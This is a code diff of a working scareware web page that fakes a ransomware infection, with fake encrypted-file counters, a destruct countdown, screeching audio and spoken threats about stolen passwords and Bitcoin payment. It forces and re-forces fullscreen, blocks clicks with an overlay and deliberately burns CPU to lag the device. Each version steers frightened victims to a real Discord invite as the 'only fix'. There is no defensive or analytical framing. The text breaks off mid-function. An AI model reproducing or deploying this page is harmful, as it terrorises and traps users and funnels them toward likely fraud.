@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔴 CRITICAL - YOUR PC IS INFECTED 🔴</title>
+    <title>🔴 PC INFECTED - EMERGENCY 🔴</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body {
@@ -11,539 +11,426 @@
             font-family: 'Courier New', monospace; user-select: none;
         }
         body {
-            background: linear-gradient(45deg, #000011, #110000, #220000, #440000, #660000, #880000, #aa0000, #cc0000);
-            background-size: 1200% 1200%;
-            animation: inferno 0.3s infinite alternate;
+            background: linear-gradient(45deg, #000008, #080000, #100000, #200000, #300000, #500000, #700000, #900000);
+            background-size: 1500% 1500%;
+            animation: apocalypse 0.25s infinite alternate;
             position: relative; cursor: none !important;
         }
-        @keyframes inferno {
-            0% { background-position: 0% 50%; filter: brightness(0.8) contrast(1.2); }
-            100% { background-position: 100% 50%; filter: brightness(1.4) contrast(1.5); }
+        @keyframes apocalypse {
+            0% { background-position: 0% 50%; filter: brightness(0.7) contrast(1.4); }
+            100% { background-position: 100% 50%; filter: brightness(1.5) contrast(1.6); }
         }
         
-        /* ESCAPE-PROOF OVERLAYS */
+        /* UNIVERSAL TRAPS */
         .trap-overlay {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
             z-index: 9999999; pointer-events: all;
         }
         .scan-lines {
-            position: fixed; top: 0; left: -150%; width: 300%; height: 4px;
-            background: linear-gradient(90deg, transparent, #00ff41, #ffff00, #ff0000, #ff00ff, transparent);
-            box-shadow: 0 0 30px #00ff41; z-index: 10001;
-            animation: hyperScan 1.2s linear infinite;
+            position: fixed; top: 0; left: -200%; width: 400%; height: 3px;
+            background: linear-gradient(90deg, transparent, #00ff44, #ffff00, #ff0000, #ff44ff, transparent);
+            box-shadow: 0 0 25px #00ff44; z-index: 10002;
+            animation: ultimateScan 1s linear infinite;
         }
-        @keyframes hyperScan {
-            0% { left: -150%; opacity: 0.8; }
-            50% { opacity: 1; }
-            100% { left: 100%; opacity: 0.8; }
+        @keyframes ultimateScan {
+            0% { left: -200%; opacity: 1; }
+            100% { left: 100%; opacity: 1; }
         }
         
-        /* SMALL GUI - VISIBLE BUT TERRIFYING */
+        /* ULTRA-COMPACT CENTERED GUI - PHONE/PC PERFECT */
         .main-gui {
-            position: fixed; top: 15%; left: 5%; width: 90vw; max-width: 800px;
-            background: rgba(0,0,0,0.97); border: 4px solid #ff0000;
-            border-radius: 12px; padding: 25px; box-shadow: 0 0 80px #ff0000;
-            animation: guiShake 0.15s infinite; z-index: 100000;
-            font-size: 14px; line-height: 1.3;
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: clamp(280px, 85vw, 380px); max-height: 85vh;
+            background: rgba(0,0,0,0.98); border: 3px solid #ff0000;
+            border-radius: 12px; padding: 20px; box-shadow: 0 0 60px #ff0000;
+            animation: centerShake 0.12s infinite; z-index: 100000;
+            overflow-y: auto; font-size: clamp(11px, 2.5vw, 14px);
         }
-        @keyframes guiShake {
-            0%, 100% { transform: translateX(0) rotate(0deg); }
-            25% { transform: translateX(-2px) rotate(-1deg); }
-            75% { transform: translateX(2px) rotate(1deg); }
+        @keyframes centerShake {
+            0%, 100% { transform: translate(-50%, -50%) translateX(0) rotate(0deg); }
+            25% { transform: translate(-50%, -50%) translateX(-1.5px) rotate(-0.8deg); }
+            75% { transform: translate(-50%, -50%) translateX(1.5px) rotate(0.8deg); }
         }
         
+        /* COMPACT TITLE */
         .title-bar {
-            font-size: 22px; font-weight: 900; color: #ffff00;
-            text-shadow: 0 0 25px #ffff00; margin-bottom: 18px;
-            letter-spacing: 3px; text-transform: uppercase;
-            animation: titleFlicker 0.4s infinite;
+            font-size: clamp(18px, 5vw, 24px); font-weight: 900; color: #ffff00;
+            text-shadow: 0 0 20px #ffff00; margin-bottom: 15px;
+            letter-spacing: 2px; text-align: center; text-transform: uppercase;
+            animation: titleGlitch 0.3s infinite;
         }
-        @keyframes titleFlicker {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0.7; }
+        @keyframes titleGlitch {
+            0%, 60% { opacity: 1; }
+            61%, 100% { opacity: 0.65; }
         }
         
+        /* TIGHT THREAT CARDS */
         .threat-grid {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0;
+            display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 15px 0;
         }
         .threat-card {
-            background: rgba(255,0,0,0.3); border: 2px solid #ff4444;
-            padding: 12px 18px; border-radius: 8px; text-align: center;
-            font-weight: 700; color: #ffff00; box-shadow: 0 0 20px rgba(255,0,0,0.6);
-            animation: threatPulse 1.5s infinite;
+            background: rgba(255,0,0,0.25); border: 2px solid #ff3333;
+            padding: 10px 12px; border-radius: 8px; text-align: center;
+            font-weight: 700; color: #ffff00; box-shadow: 0 0 15px rgba(255,0,0,0.7);
+            animation: threatBeat 1.2s infinite;
         }
-        @keyframes threatPulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(255,0,0,0.6); }
-            50% { transform: scale(1.03); box-shadow: 0 0 35px rgba(255,255,0,0.9); }
+        @keyframes threatBeat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.02); }
         }
+        .threat-icon { font-size: clamp(20px, 6vw, 28px); margin-bottom: 6px; }
+        .threat-count { font-size: clamp(18px, 5vw, 24px); color: #ff0000; font-weight: 900; }
         
+        /* SMALL COUNTDOWN */
         .countdown-display {
-            font-size: 36px; font-weight: 900; color: #ff0000;
-            text-shadow: 0 0 30px #ff0000; margin: 20px 0;
-            background: rgba(0,0,0,0.8); padding: 15px; border-radius: 8px;
-            animation: countdownExplode 0.3s infinite;
+            font-size: clamp(24px, 7vw, 32px); font-weight: 900; color: #ff0000;
+            text-shadow: 0 0 25px #ff0000; margin: 15px 0; padding: 12px;
+            background: rgba(0,0,0,0.8); border-radius: 8px; text-align: center;
+            animation: bombTick 0.25s infinite;
         }
-        @keyframes countdownExplode {
+        @keyframes bombTick {
             0% { transform: scale(1); }
-            50% { transform: scale(1.08); }
+            50% { transform: scale(1.06); }
             100% { transform: scale(1); }
         }
         
-        /* DISCORD BUTTON - PRIMARY PAYLOAD */
-        .discord-btn {
-            background: linear-gradient(45deg, #5865F2, #4752C4);
-            border: 3px solid #ffffff; color: #ffffff; padding: 18px 40px;
-            font-size: 18px; font-weight: 900; border-radius: 12px;
-            cursor: pointer; margin: 25px 10px; display: inline-block;
-            text-transform: uppercase; letter-spacing: 2px; position: relative;
-            overflow: hidden; box-shadow: 0 10px 30px rgba(88,101,242,0.6);
-            transition: all 0.25s; font-family: 'Arial Black', sans-serif;
-            animation: discordGlow 2s infinite alternate;
+        /* DISCORD BUTTON - CENTERED HERO */
+        .discord-section {
+            text-align: center; margin: 20px 0; padding: 15px;
+            background: linear-gradient(135deg, rgba(88,101,242,0.2), rgba(71,82,196,0.2));
+            border: 2px solid #5865F2; border-radius: 12px;
         }
-        @keyframes discordGlow {
-            0% { box-shadow: 0 10px 30px rgba(88,101,242,0.6); }
-            100% { box-shadow: 0 15px 45px rgba(88,101,242,1); }
+        .discord-btn {
+            background: linear-gradient(45deg, #5865F2, #4752C4, #5865F2);
+            border: 3px solid #ffffff; color: #ffffff; padding: clamp(14px, 4vw, 18px) clamp(25px, 8vw, 40px);
+            font-size: clamp(14px, 4vw, 18px); font-weight: 900; border-radius: 12px;
+            cursor: pointer; text-transform: uppercase; letter-spacing: 1.5px;
+            box-shadow: 0 8px 25px rgba(88,101,242,0.7); transition: all 0.2s;
+            font-family: 'Arial Black', sans-serif; position: relative; overflow: hidden;
+            animation: discordPulse 1.8s infinite alternate;
+        }
+        @keyframes discordPulse {
+            0% { box-shadow: 0 8px 25px rgba(88,101,242,0.7); }
+            100% { box-shadow: 0 12px 35px rgba(88,101,242,1); }
         }
         .discord-btn:hover {
-            transform: scale(1.1) translateY(-5px);
-            box-shadow: 0 20px 50px rgba(88,101,242,1);
+            transform: scale(1.08) translateY(-3px); box-shadow: 0 15px 40px rgba(88,101,242,1);
         }
-        .discord-btn:active {
-            transform: scale(0.98); box-shadow: 0 5px 20px rgba(88,101,242,0.8);
-        }
+        .discord-btn:active { transform: scale(0.97); }
         
-        /* Progress bars */
-        .prog-row { margin: 12px 0; }
+        /* COMPACT PROGRESS */
+        .prog-row { margin: 10px 0; font-size: clamp(11px, 3vw, 13px); }
         .prog-bar {
-            height: 18px; background: rgba(0,0,0,0.9); border-radius: 9px;
-            overflow: hidden; border: 2px solid #00ff41; position: relative;
+            height: 14px; background: rgba(0,0,0,0.85); border-radius: 7px;
+            overflow: hidden; border: 2px solid #00ff44; position: relative;
         }
         .prog-fill {
-            height: 100%; background: linear-gradient(90deg, #ff0000, #ffff00, #00ff41);
-            width: 0%; animation: fillGlitch 1.5s infinite;
-            box-shadow: 0 0 15px #00ff41;
+            height: 100%; background: linear-gradient(90deg, #ff0000, #ffff00, #00ff44);
+            width: 0%; animation: progChaos 1.2s infinite; box-shadow: 0 0 12px #00ff44;
         }
-        @keyframes fillGlitch {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(5px); }
-            75% { transform: translateX(-5px); }
+        @keyframes progChaos {
+            0%, 100% { transform: translateX(0) skewX(0deg); }
+            33% { transform: translateX(3px) skewX(-2deg); }
+            66% { transform: translateX(-3px) skewX(2deg); }
         }
         
-        /* Terminal */
+        /* MINI TERMINAL */
         .term-window {
-            background: rgba(0,0,0,0.95); border: 2px solid #00ff41;
-            border-radius: 8px; padding: 18px; margin: 20px 0;
-            max-height: 220px; overflow-y: auto; font-size: 12px;
-            color: #00ff41; box-shadow: inset 0 0 25px rgba(0,255,65,0.3);
+            background: rgba(0,0,0,0.95); border: 2px solid #00ff44;
+            border-radius: 8px; padding: 15px; margin: 15px 0;
+            max-height: 160px; overflow-y: auto; font-size: clamp(10px, 2.2vw, 12px);
+            color: #00ff44; box-shadow: inset 0 0 20px rgba(0,255,68,0.25);
+            font-family: monospace;
         }
-        .term-line { padding: 3px 0; }
-        .term-err { color: #ff4444 !important; font-weight: bold; }
+        .term-line { padding: 2px 0; line-height: 1.3; }
+        .term-err { color: #ff3333 !important; font-weight: bold; }
         .term-warn { color: #ffff00 !important; }
         
-        /* LAG GENERATORS */
-        #lagCanvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; opacity: 0.08; }
-        .static-noise {
+        /* LAG ENGINES */
+        #lagCanvas { 
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
+            z-index: 1; opacity: 0.1; 
+        }
+        .static-chaos {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-image: 
-                radial-gradient(2px 2px at 20px 30px, #ff0000, transparent),
-                radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.4), transparent),
-                radial-gradient(1px 1px at 90px 40px, #00ff41, transparent),
-                radial-gradient(1px 1px at 130px 80px, rgba(255,0,255,0.6), transparent);
-            background-size: 200px 200px; pointer-events: none; z-index: 2;
-            animation: noiseChaos 0.08s infinite steps(10);
+                radial-gradient(1.5px 1.5px at 25px 35px, #ff0000, transparent),
+                radial-gradient(1px 1px at 50px 80px, #ffffff, transparent),
+                radial-gradient(0.8px 0.8px at 90px 45px, #00ff44, transparent),
+                radial-gradient(1.2px 1.2px at 130px 75px, #ff00ff, transparent);
+            background-size: 180px 180px; pointer-events: none; z-index: 2;
+            animation: chaosStatic 0.06s infinite steps(12);
         }
-        @keyframes noiseChaos {
-            0% { transform: translate(0px,0px); }
-            100% { transform: translate(4px,3px); }
+        @keyframes chaosStatic {
+            0% { transform: translate(0,0); }
+            100% { transform: translate(3px,2px); }
         }
         
-        /* POPUP HELL */
+        /* MICRO POPUPS */
         .popup-hell {
-            position: fixed; padding: 15px 25px; background: rgba(255,0,0,0.98);
-            color: #ffff00; font-weight: 900; font-size: 16px; border-radius: 10px;
-            box-shadow: 0 0 35px #ff0000; z-index: 1000000; transform: scale(0);
-            animation: popupExplode 0.5s forwards;
+            position: fixed; padding: clamp(10px, 3vw, 15px) clamp(20px, 6vw, 25px);
+            background: rgba(255,0,0,0.98); color: #ffff00; font-weight: 900;
+            font-size: clamp(12px, 3.5vw, 16px); border-radius: 10px;
+            box-shadow: 0 0 30px #ff0000; z-index: 1000000; transform: scale(0);
+            animation: microPop 0.4s forwards;
         }
-        @keyframes popupExplode {
-            0% { transform: scale(0) rotate(-15deg); opacity: 0; }
-            50% { transform: scale(1.15) rotate(8deg); opacity: 1; }
-            100% { transform: scale(1) rotate(0deg); opacity: 1; }
+        @keyframes microPop {
+            0% { transform: scale(0) rotate(-12deg); opacity: 0; }
+            50% { transform: scale(1.1) rotate(6deg); opacity: 1; }
+            100% { transform: scale(1) rotate(0); opacity: 1; }
         }
         
-        /* TTS Status */
-        .tts-indicator {
-            position: fixed; bottom: 20px; right: 20px; background: rgba(0,255,0,0.9);
-            color: #000; padding: 10px 20px; border-radius: 25px; font-weight: bold;
-            font-size: 14px; z-index: 10001; animation: ttsPulse 1s infinite;
+        /* TTS BADGE */
+        .tts-badge {
+            position: fixed; bottom: 15px; right: 15px; background: rgba(0,255,0,0.95);
+            color: #000000; padding: 8px 16px; border-radius: 20px; font-weight: bold;
+            font-size: clamp(10px, 2.8vw, 13px); z-index: 10002; animation: ttsBeat 0.8s infinite;
+            box-shadow: 0 0 15px rgba(0,255,0,0.8);
         }
-        @keyframes ttsPulse {
-            0%, 100% { background: rgba(0,255,0,0.9); }
-            50% { background: rgba(0,255,0,1); }
+        @keyframes ttsBeat {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
     </style>
 </head>
 <body>
-    <!-- TOTAL LOCKDOWN TRAPS -->
-    <div class="trap-overlay" id="masterTrap"></div>
+    <!-- IMPENETRABLE TRAPS -->
+    <div class="trap-overlay" id="nuclearTrap"></div>
     <div class="scan-lines"></div>
-    <div class="scan-lines" style="animation-delay: 0.6s; top: 25%;"></div>
-    <div class="scan-lines" style="animation-delay: 1.2s; top: 50%;"></div>
-    <div class="scan-lines" style="animation-delay: 0.3s; top: 75%;"></div>
-    <div class="static-noise"></div>
+    <div class="scan-lines" style="animation-delay: 0.5s; top: 20%;"></div>
+    <div class="scan-lines" style="animation-delay: 0.25s; top: 45%;"></div>
+    <div class="scan-lines" style="animation-delay: 0.75s; top: 70%;"></div>
+    <div class="static-chaos"></div>
     
-    <!-- LAG CANVAS -->
+    <!-- LAG FACTORY -->
     <canvas id="lagCanvas"></canvas>
     
-    <!-- MAIN TINY TERRIFYING GUI -->
+    <!-- ULTRA-COMPACT CENTERED GUI -->
     <div class="main-gui">
-        <div class="title-bar">🚨 YOUR PC IS INFECTED 🚨</div>
+        <div class="title-bar">🚨 PC INFECTED 🚨</div>
         
         <div class="threat-grid">
             <div class="threat-card">
-                <div style="font-size: 28px; margin-bottom: 8px;">🔒</div>
-                <div>FILES ENCRYPTED</div>
-                <div style="font-size: 24px; color: #ff0000; font-weight: 900;" id="fileCount">2,847,392</div>
+                <div class="threat-icon">🔒</div>
+                <div>ENCRYPTED</div>
+                <div class="threat-count" id="fileTotal">3,247,891</div>
             </div>
             <div class="threat-card">
-                <div style="font-size: 28px; margin-bottom: 8px;">⏱️</div>
-                <div>DESTRUCT COUNTDOWN</div>
-                <div class="countdown-display" id="destructTimer">04:37</div>
+                <div class="threat-icon">💣</div>
+                <div>TO DESTRUCT</div>
+                <div class="countdown-display" id="nukeTimer">03:49</div>
             </div>
         </div>
         
         <div class="prog-row">
-            <div>Ransomware Progress: <span id="prog1">94%</span></div>
-            <div class="prog-bar"><div class="prog-fill" id="progFill1" style="width:94%"></div></div>
+            <span>Encryption: </span><span id="encProg">97%</span>
+            <div class="prog-bar"><div class="prog-fill" id="encFill" style="width:97%"></div></div>
         </div>
         <div class="prog-row">
-            <div>CPU Usage: <span id="cpuLoad">98%</span></div>
-            <div class="prog-bar"><div class="prog-fill" style="animation-duration: 0.8s; width:98%"></div></div>
+            <span>CPU: </span><span id="cpuUse">99%</span>
+            <div class="prog-bar"><div class="prog-fill" style="animation-duration:0.6s;width:99%"></div></div>
         </div>
         
-        <!-- DISCORD REDIRECT BUTTON -->
-        <div style="margin: 25px 0; font-size: 16px; color: #ffff00; font-weight: 700;">
-            💀 <strong>ONLY SOLUTION:</strong> Join Discord Support for Virus Removal 💀
-        </div>
-        <div>
-            <button class="discord-btn" onclick="redirectToDiscord()">
-                🎮 JOIN DISCORD TO REMOVE VIRUSES 🎮
+        <!-- DISCORD LIFELINE -->
+        <div class="discord-section">
+            <div style="color:#ffffff;font-weight:700;margin-bottom:12px;font-size:clamp(12px,3.5vw,14px);">
+                💀 <strong>ONLY FIX:</strong> Discord Virus Removal 💀
+            </div>
+            <button class="discord-btn" onclick="forceDiscordRedirect()">
+                🎮 JOIN DISCORD NOW 🎮
             </button>
         </div>
         
-        <div class="term-window" id="hijackedTerminal">
-            <div class="term-line term-err">C:\> infection_complete.exe --silent</div>
-            <div class="term-line">[-] 2.8M files encrypted ✓</div>
-            <div class="term-line term-warn">[!] Webcam/Mic ACTIVATED</div>
-            <div class="term-line term-err">[ERROR] Payment timeout - deleting files</div>
+        <div class="term-window" id="commandHijack">
+            <div class="term-line term-err">C:\> virus_deploy.exe</div>
         </div>
     </div>
     
-    <!-- TTS STATUS -->
-    <div class="tts-indicator" id="ttsStatus">🗣️ TTS: WARNINGS ACTIVE</div>
+    <!-- LIVE TTS MONITOR -->
+    <div class="tts-badge" id="voiceStatus">🗣️ WARNINGS LIVE</div>
 
     <script>
-        // ========== TOTAL SYSTEM DOMINATION ==========
+        // ========== ABSOLUTE DOMINATION MODE ==========
         'use strict';
         
-        // ESCAPE-PROOF FULLSCREEN
-        function unbreakableFullscreen() {
-            document.documentElement.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
+        // IMPENETRABLE FULLSCREEN
+        function eternalLock() {
+            document.documentElement.requestFullscreen({ navigationUI: 'hide' }).catch(()=>{});  
         }
-        unbreakableFullscreen();
+        eternalLock();
         
-        document.addEventListener('fullscreenchange', () => {
-            if (!document.fullscreenElement) {
-                setTimeout(unbreakableFullscreen, 50);
-                spawnPopup('🚫 ESCAPE BLOCKED - FILES DELETING!');
-            }
+        document.addEventListener('fullscreenchange', ()=>{
+            if(!document.fullscreenElement) setTimeout(eternalLock,10);
         });
         
-        // LAG HELL - MULTIPLE CANVAS OVERLOAD
-        const lagCanvas = document.getElementById('lagCanvas');
-        const lagCtx = lagCanvas.getContext('2d');
-        function resizeLagCanvas() {
-            lagCanvas.width = window.innerWidth * 2;
-            lagCanvas.height = window.innerHeight * 2;
-            lagCanvas.style.width = window.innerWidth + 'px';
-            lagCanvas.style.height = window.innerHeight + 'px';
+        // RESPONSIVE LAG HELL
+        const lagC = document.getElementById('lagCanvas');
+        const lag2d = lagC.getContext('2d');
+        function sizeLag() {
+            lagC.width = window.innerWidth*2.5; lagC.height = window.innerHeight*2.5;
+            lagC.style.width = window.innerWidth+'px'; lagC.style.height = window.innerHeight+'px';
         }
-        resizeLagCanvas();
-        window.addEventListener('resize', resizeLagCanvas);
+        sizeLag(); window.addEventListener('resize',sizeLag);
         
-        // PARTICLE LAG SYSTEM
-        const particles = [];
-        for (let i = 0; i < 5000; i++) {
-            particles.push({
-                x: Math.random() * lagCanvas.width,
-                y: Math.random() * lagCanvas.height,
-                vx: (Math.random() - 0.5) * 4,
-                vy: (Math.random() - 0.5) * 4,
-                life: Math.random() * 255
+        // 8000 PARTICLE MELTDOWN
+        const pSys = []; for(let i=0;i<8000;i++){
+            pSys.push({x:Math.random()*lagC.width,y:Math.random()*lagC.height,
+                      vx:(Math.random()-0.5)*6,vy:(Math.random()-0.5)*6,l:Math.random()*200});
+        }
+        function particleHell(){
+            lag2d.fillStyle='rgba(0,0,0,0.12)'; lag2d.fillRect(0,0,lagC.width,lagC.height);
+            lag2d.fillStyle='#ff0000'; pSys.forEach((p,i)=>{
+                p.x+=p.vx; p.y+=p.vy; p.l-=3;
+                if(p.l>0){ lag2d.globalAlpha=p.l/200; lag2d.fillRect(p.x,p.y,1.5,1.5); }
+            }); requestAnimationFrame(particleHell);
+        } particleHell();
+        
+        // CPU ANNIHILATOR
+        function totalCPUMelt(){
+            let x=0,y=0,z=0; function fry(){
+                for(let i=0;i<3000000;i++){
+                    x=(x+y*z)%0xFFFFFFFF; y=(y+z*x)%0xFFFFFFFF; z=(z+x*y)%0xFFFFFFFF;
+                } requestAnimationFrame(fry);
+            } fry();
+        } totalCPUMelt();
+        
+        // MATRIX HELL
+        const mC=document.createElement('canvas'); const m2d=mC.getContext('2d');
+        mC.width=window.innerWidth; mC.height=window.innerHeight;
+        mC.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:3;opacity:0.15;pointer-events:none';
+        document.body.appendChild(mC);
+        
+        const chars='アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモ０１２３４５６７８９';
+        const mDrops=Array(Math.floor(window.innerWidth/10)).fill(1);
+        function matrixDoom(){ 
+            m2d.fillStyle='rgba(0,0,0,0.06)'; m2d.fillRect(0,0,mC.width,mC.height);
+            m2d.fillStyle='#00ff41'; m2d.font='10px monospace';
+            mDrops.forEach((d,i)=>{ 
+                const ch=chars[Math.floor(Math.random()*chars.length)];
+                m2d.fillText(ch,i*10,d*10);
+                if(d*10>mC.height&&Math.random()>0.96) mDrops[i]=0; mDrops[i]++;
             });
-        }
-        function renderLagParticles() {
-            lagCtx.fillStyle = 'rgba(0,0,0,0.1)';
-            lagCtx.fillRect(0, 0, lagCanvas.width, lagCanvas.height);
-            
-            lagCtx.fillStyle = '#ff0000';
-            particles.forEach((p, i) => {
-                p.x += p.vx; p.y += p.vy; p.life -= 2;
-                if (p.life > 0) {
-                    lagCtx.globalAlpha = p.life / 255;
-                    lagCtx.fillRect(p.x, p.y, 2, 2);
-                }
-            });
-            requestAnimationFrame(renderLagParticles);
-        }
-        renderLagParticles();
+        } setInterval(matrixDoom,35);
         
-        // CPU MELTDOWN LOOPS
-        function cpuHell() {
-            let a = 0, b = 0, c = 0;
-            function spin() {
-                for (let i = 0; i < 2000000; i++) {
-                    a = (a + b * c) % 0xFFFFFFFF;
-                    b = (b + c * a) % 0xFFFFFFFF;
-                    c = (c + a * b) % 0xFFFFFFFF;
-                }
-                requestAnimationFrame(spin);
-            }
-            spin();
-        }
-        cpuHell(); // 100% CPU GUARANTEED
+        // STATE
+        let fCount=3247891; let tLeft=229; let vIndex=0; let ttsOn=true;
         
-        // MATRIX OVERLAY
-        const matrixCtx = document.createElement('canvas').getContext('2d');
-        matrixCtx.canvas.width = window.innerWidth;
-        matrixCtx.canvas.height = window.innerHeight;
-        matrixCtx.canvas.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:3;opacity:0.12;pointer-events:none';
-        document.body.appendChild(matrixCtx.canvas);
-        
-        const katakana = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン０１２３４５６７８９';
-        const drops = Array(Math.floor(window.innerWidth / 12)).fill(1);
-        function matrixRain() {
-            matrixCtx.fillStyle = 'rgba(0,0,0,0.05)';
-            matrixCtx.fillRect(0, 0, matrixCtx.canvas.width, matrixCtx.canvas.height);
-            matrixCtx.fillStyle = '#00ff41';
-            matrixCtx.font = '12px monospace';
-            drops.forEach((drop, i) => {
-                const char = katakana[Math.floor(Math.random() * katakana.length)];
-                matrixCtx.fillText(char, i * 12, drop * 12);
-                if (drop * 12 > matrixCtx.canvas.height && Math.random() > 0.97) drops[i] = 0;
-                drops[i]++;
-            });
-        }
-        setInterval(matrixRain, 40);
-        
-        // STATE VARIABLES
-        let fileCount = 2847392;
-        let timeLeft = 277; // 4:37
-        let ttsActive = true;
-        
-        // DISCORD REDIRECT - PRIMARY ATTACK VECTOR
-        function redirectToDiscord() {
-            // MULTIPLE REDIRECTS FOR PERSISTENCE
-            window.open('https://discord.gg/8qfT6BB5Wn', '_blank');
-            window.open('https://discord.gg/8qfT6BB5Wn', '_self');
-            setTimeout(() => {
-                document.body.innerHTML = '<h1 style="color:#5865F2;font-size:48px;text-align:center;margin-top:20%;">Joining Discord Support...</h1>';
-            }, 1000);
+        // DISCORD NUCLEAR REDIRECT
+        function forceDiscordRedirect(){
+            window.open('https://discord.gg/8qfT6BB5Wn','_blank');
+            window.open('https://discord.gg/8qfT6BB5Wn','_self');
+            setTimeout(()=>{
+                document.body.innerHTML='<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:#5865F2;font-size:clamp(24px,8vw,48px);font-weight:900;text-align:center;"><div>🔗 Discord Support</div><div style="font-size:0.4em;margin-top:15px;">Loading virus removal...</div></div>';
+            },800);
         }
         
-        // HYPER-AGGRESSIVE FILE COUNT
-        function escalateThreat() {
-            fileCount += Math.floor(Math.random() * 15000) + 5000;
-            document.getElementById('fileCount').textContent = fileCount.toLocaleString();
-            const prog = Math.min((fileCount / 10000000) * 100, 99.9);
-            document.getElementById('prog1').textContent = prog.toFixed(1) + '%';
-            document.getElementById('progFill1').style.width = prog + '%';
-        }
-        setInterval(escalateThreat, 1200);
+        // THREAT ESCALATION
+        function threatSpike(){
+            fCount+=Math.floor(Math.random()*12000)+8000;
+            document.getElementById('fileTotal').textContent=fCount.toLocaleString();
+            const p=(fCount/12000000)*100; document.getElementById('encProg').textContent=p.toFixed(1)+'%';
+            document.getElementById('encFill').style.width=p+'%';
+        } setInterval(threatSpike,1000);
         
-        // DESTRUCT COUNTDOWN
-        function tickDestruct() {
-            timeLeft--;
-            const m = Math.floor(timeLeft / 60);
-            const s = timeLeft % 60;
-            document.getElementById('destructTimer').textContent = 
-                `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-            
-            if (timeLeft % 15 === 0) {
-                spawnPopup(`🚨 ${timeLeft}s UNTIL TOTAL DESTRUCTION 🚨`);
-                playGlitchScreech();
-            }
-            if (timeLeft <= 0) {
-                document.body.innerHTML = '<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:#ff0000;font-size:6em;font-weight:900;text-align:center;">💀 PC DESTROYED 💀<br><div style="font-size:0.4em;margin-top:20px;">Join Discord for recovery</div></div>';
-                redirectToDiscord();
-            }
-        }
-        setInterval(tickDestruct, 1000);
+        // NUKE COUNTDOWN
+        function nukeTick(){
+            tLeft--; const m=Math.floor(tLeft/60),s=tLeft%60;
+            document.getElementById('nukeTimer').textContent=`${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+            if(tLeft%12===0){ terrorPopup(`💣 ${tLeft}s TO TOTAL WIPE 💣`); glitchHell(); }
+            if(tLeft<=0){ document.body.innerHTML='<div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:#ff0000;font-size:clamp(28px,10vw,64px);font-weight:900;text-align:center;">💀 DESTROYED 💀<br><small style="font-size:0.3em;">Discord recovery only</small></div>'; forceDiscordRedirect(); }
+        } setInterval(nukeTick,1000);
         
-        // GLITCH SOUNDS
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        function playGlitchScreech() {
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.connect(gain); gain.connect(audioCtx.destination);
-            
-            osc.type = 'sawtooth';
-            osc.frequency.setValueAtTime(1000 + Math.random() * 2000, audioCtx.currentTime);
-            osc.frequency.exponentialRampToValueAtTime(50, audioCtx.currentTime + 0.8);
-            
-            gain.gain.setValueAtTime(0.4, audioCtx.currentTime);
-            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.8);
-            
-            osc.start(); osc.stop(audioCtx.currentTime + 0.8);
+        // GLITCH NOISE HELL
+        const aCtx=new(window.AudioContext||window.webkitAudioContext)();
+        function glitchHell(){
+            const o=aCtx.createOscillator(), g=aCtx.createGain();
+            o.connect(g); g.connect(aCtx.destination); o.type='sawtooth';
+            o.frequency.setValueAtTime(1200+Math.random()*1800,aCtx.currentTime);
+            o.frequency.exponentialRampToValueAtTime(80,aCtx.currentTime+0.6);
+            g.gain.setValueAtTime(0.35,aCtx.currentTime);
+            g.gain.exponentialRampToValueAtTime(0.01,aCtx.currentTime+0.6);
+            o.start(); o.stop(aCtx.currentTime+0.6);
         }
         
-        // NONSTOP TTS TERROR
-        const ttsMessages = [
-            "Warning! Your computer has been infected with ransomware!",
-            "Two million files have been encrypted!",
-            "Pay the ransom or lose everything!",
-            "Your webcam and microphone are now active!",
-            "All passwords have been stolen!",
-            "Self destruct sequence initiated!",
-            "Join Discord immediately for removal instructions!",
-            "Do not close this window or contact authorities!",
-            "Your files are being permanently deleted!",
-            "Bitcoin payment required within four minutes!"
+        // ENDLESS TTS TERROR
+        const voiceThreats=[
+            "Computer infected with ransomware virus!",
+            "Over three million files encrypted!",
+            "All your data will be destroyed soon!",
+            "Webcam microphone passwords stolen!",
+            "Self destruct in three minutes!",
+            "Join Discord for emergency removal!",
+            "Do not close browser authorities!",
+            "Files deleting payment required!",
+            "Bitcoin to Discord support now!",
+            "Virus spreading to all drives!"
         ];
+        function voiceDoom(){
+            if(!ttsOn) return; const u=new SpeechSynthesisUtterance(voiceThreats[vIndex]);
+            u.rate=1.3; u.pitch=0.7; u.volume=1;
+            u.onstart=()=>{ document.getElementById('voiceStatus').textContent='🗣️ VIRUS ALERT LIVE'; glitchHell(); };
+            u.onend=()=>{ document.getElementById('voiceStatus').textContent='🗣️ NEXT ALERT...'; vIndex=(vIndex+1)%voiceThreats.length; setTimeout(voiceDoom,1500+Math.random()*2500); };
+            speechSynthesis.speak(u);
+        } voiceDoom();
         
-        let ttsIndex = 0;
-        function terrorTTS() {
